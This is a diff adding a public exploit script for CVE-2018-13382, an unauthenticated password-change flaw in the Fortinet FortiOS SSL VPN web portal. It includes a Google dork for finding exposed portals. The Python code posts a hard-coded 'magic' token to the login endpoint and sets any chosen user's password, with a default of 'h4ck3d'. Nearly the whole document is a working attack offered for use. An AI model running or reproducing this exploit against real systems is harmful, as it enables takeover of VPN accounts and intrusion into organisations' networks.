@@ -1,0 +1,37 @@
+# Exploit Title: Fortinet FortiOS 6.0.4 - Unauthenticated SSL VPN User Password Modification
+# Google Dork: intitle:"Please Login" "Use FTM Push"
+# Date: 15/11/2020
+# Exploit Author: Ricardo Longatto
+# Details: This exploit allow change users password from SSLVPN web portal
+# Vendor Homepage: https://www.fortinet.com/
+# Version: Exploit to Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.0 to 5.6.8 and 5.4.1 to 5.4.10.
+# Tested on: 6.0.4
+# NVD: https://nvd.nist.gov/vuln/detail/CVE-2018-13382
+# CVE : CVE-2018-13382
+# Credits: Vulnerability by Meh Chang and Orange Tsai.
+
+#!/usr/bin/env python
+
+import requests, urllib3, sys, re, argparse
+urllib3.disable_warnings()
+
+menu = argparse.ArgumentParser(description = "[+] Exploit FortiOS Magic backdoor - CVE-2018-13382 [+]")
+menu.add_argument('-t', metavar='Target/Host IP', required=True)
+menu.add_argument('-p', metavar='Port', required=True)
+menu.add_argument('-u', metavar='User', required=True)
+menu.add_argument('--setpass', metavar='SetNewPass', default='h4ck3d', help='set the password for user, if you not set, the default password will be set to h4ck3d')
+op = menu.parse_args()
+
+host = op.t
+port = op.p
+user = op.u
+setpass = op.setpass
+
+url = "https://"+host+":"+port+"/remote/logincheck"
+exploit = {'ajax':'1','username':user,'magic':'4tinet2095866','credential':setpass}
+r = requests.post(url, verify=False, data = exploit)
+
+if re.search("/remote/hostcheck_install",r.text):
+    print "[+] - The new password to ["+user+"] is "+setpass+" <<<< [+]"
+else:
+    print "Exploit Failed. :/"
